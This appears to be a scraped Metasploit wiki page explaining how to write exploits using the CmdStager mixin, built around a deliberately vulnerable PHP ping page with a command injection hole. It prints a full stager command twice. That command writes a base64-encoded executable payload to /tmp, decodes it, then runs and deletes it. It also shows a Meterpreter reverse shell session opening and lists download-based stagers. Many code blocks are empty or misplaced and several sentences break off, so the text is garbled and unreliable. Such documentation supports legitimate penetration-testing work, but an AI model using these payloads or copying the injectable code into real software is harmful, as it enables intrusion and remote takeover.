# The Vulnerability Test Case
The best way to explain how to use a command stager is probably by demonstrating it. Here we have a command injection vulnerability in example PHP code, something silly you actually might see in enterprise-level software. The bug is that you can inject additional system commands in the system call for ping:
```msf
msf exploit(cmdstager_demo) > run

[*] Started reverse TCP handler on 10.6.0.92:4444
[*] Exploiting...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 10.6.0.92
[*] Meterpreter session 1 opened (10.6.0.92:4444 -> 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500
```

you the output:
```
[*] Generated command stager: ["echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAA
AAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAAMf9qCViZthBIidZNMclqIkFaagdaDwVIhcB4UWoK
QVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgARXAoFh8lRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+
Wg8FSIXAeO3/5g==>>'/tmp/XtMnQ.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (w
hich openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; pri
nt base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)
')) 2> /dev/null > '/tmp/IPUov' < '/tmp/XtMnQ.b64' ; chmod +x '/tmp/IPUov' ; '/tmp/IPUov' ; rm -f '/tmp/IPUov' ; rm -f '
/tmp/XtMnQ.b64'"]
```

`php
<?php
   if ( isset($_GET["ip"]) ) {
      $output = system("ping -c 1 " . $_GET["ip"]);
      die($output);
   }
?>

<html>
<body>
  <form action = "ping.php" method = "GET">
   IP to ping: <input type = "text" name = "ip" /> <input type = "submit" />
  </form>
   </body>
</html>
`

`

See the www-data? That is the output for the second command we asked the script to execute. By doing that, we can also do something even more nasty - like writing a Meterpreter payload onto the target system, and execute it.


# The Msf::Exploit::CmdStager Mixin

Now let's talk about how to use a command stager to exploit the above script. There are a couple of steps you need to do:

**1. Include the Msf::Exploit::CmdStager mixin**

Although there are many flavors of mixins/stagers, you only need to include [Msf::Exploit::CmdStager](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/cmd_stager.rb) when writing a Metasploit exploit. The mixin is basically an interface to all command stagers:

`

`

**2. Declare your flavors**

To tell `

`


**3. Create the execute_command method**

You also must create a `

` will automatically display the http traffic as it is sent and received.

**4. Decide on the supported payloads**

CmdStagers are intended to support payloads that are uploaded, saved to disk, and launched, but many of the payloads in Metasploit Framework do not need to be saved to disk; these payloads are `

` and includes binary elf payloads.  These payload types must be saved to disk before they can be launched, and as such, you will often see this second type of payload referred to as a ‘dropper’ because the file must be ‘dropped’ to the disk before it can be executed.  In each of the targets above, we’ve selected a default payload we know will work.  

**4. Executing a payload**
As we said earlier, the way a payload is executed depends on the payload type.  By including `

`:

* **flavor** - You can specify what command stager (flavor) to use from here.
* **delay** - How much time to delay between each command execution. 0.25 is default.
* **linemax** - Maximum number of characters per command. 2047 is default.

**Msf::Exploit::CmdStager Template**

At the minimum, this is how your exploit should start when you're using the CmdStager mixin:

`

`msf
msf exploit(cmdstager_demo) > run

[*] Started reverse TCP handler on 10.6.0.92:4444
[*] Exploiting...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] Sending stage (1495599 bytes) to 10.6.0.92
[*] Meterpreter session 1 opened (10.6.0.92:4444 -> 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500
`

`.

Available flavors:

Flavors requiring the payload to be broken apart and embedded into the commands:
* [bourne](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/bourne.rb)
* [certutil](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/certutil.rb)
* [debug_asm](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/debug_asm.rb)
* [debug_write](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/debug_write.rb)
* [echo](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/echo.rb)
* [printf](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/printf.rb)
* [vbs](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/vbs.rb)

Flavors that rely on using a command to retrieve the payload via network connection
* [curl](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/curl.rb)
* [fetch](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/fetch.rb)
* [lwprequest](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/lwprequest.rb)
* [psh_invokewebrequest](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/psh_invokewebrequest.rb)
* [tftp](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/tftp.rb)
* [wget](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/wget.rb)


## VBS Command Stager - Windows Only

The [VBS command stager](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/vbs.rb) is for Windows. What this does is it encodes our payload with Base64, save it on the target machine, also writes a [VBS script](https://github.com/rapid7/rex-exploitation/blob/master/data/exploits/cmdstager/vbs_b64) using the echo command, and then lets the VBS script to decode the Base64 payload, and execute it.

If you are exploiting Windows that supports Powershell, then you might want to [[consider using that instead|./How-to-use-Powershell-in-an-exploit.md]] of the VBS stager, because Powershell tends to be more stealthy.

To use the VBS stager, either specify your CmdStagerFlavor in the metadata:

`

`


## Certutil Command Stager - Windows Only

[Certutil](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/certutil.rb) is a Windows command that can be used to dump and display certification authority, configuration information, configure certificate services, back up and restore CA components, etc. It only comes with newer Windows systems starting from Windows 2012, and Windows 8.  I find the certutil flavor confusing, as certutil can be used to download files just like `

`

## Bourne Command Stager - Multi Platform

**Linemax** minimum: 373

The [Bourne](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/bourne.rb) command stager supports multiple platforms except for Windows. Just like many other stagers, it writes a base64 encoded payload to disk, but then it tries to decode it using four different commands: base64, openssl, python, and perl.  This is very useful if the target's OS is unpredictable. You can see the way it attempts to use multiple decoding techniques by setting `

`
[*] Generated command stager: ["echo -n f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAAeABAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAEAAOAABAAAA
AAAAAAEAAAAHAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAA+gAAAAAAAAB8AQAAAAAAAAAQAAAAAAAAMf9qCViZthBIidZNMclqIkFaagdaDwVIhcB4UWoK
QVlQailYmWoCX2oBXg8FSIXAeDtIl0i5AgARXAoFh8lRSInmahBaaipYDwVZSIXAeSVJ/8l0GFdqI1hqAGoFSInnSDH2DwVZWV9IhcB5x2o8WGoBXw8FXmp+
Wg8FSIXAeO3/5g==>>'/tmp/XtMnQ.b64' ; ((which base64 >&2 && base64 -d -) || (which base64 >&2 && base64 --decode -) || (w
hich openssl >&2 && openssl enc -d -A -base64 -in /dev/stdin) || (which python >&2 && python -c 'import sys, base64; pri
nt base64.standard_b64decode(sys.stdin.read());') || (which perl >&2 && perl -MMIME::Base64 -ne 'print decode_base64($_)
')) 2> /dev/null > '/tmp/IPUov' < '/tmp/XtMnQ.b64' ; chmod +x '/tmp/IPUov' ; '/tmp/IPUov' ; rm -f '/tmp/IPUov' ; rm -f '
/tmp/XtMnQ.b64'"]
`

`


## Echo Command Stager - Multi Platform

**Linemax** minimum: 26

The [echo](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/echo.rb) command stager is suitable for multiple platforms except for Windows. It just [echos](http://manpages.ubuntu.com/manpages/trusty/man1/echo.1fun.html) the payload, chmod and execute it. An example of that looks similar to this:

`

`


## Printf Command Stager - Multi Platform

**Linemax** minimum: 25

The [printf](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/printf.rb) command stager is also suitable for multiple platforms except for Windows. It just uses the printf command to write the payload to disk, chmod and execute it. An example of that looks similar to this:

`

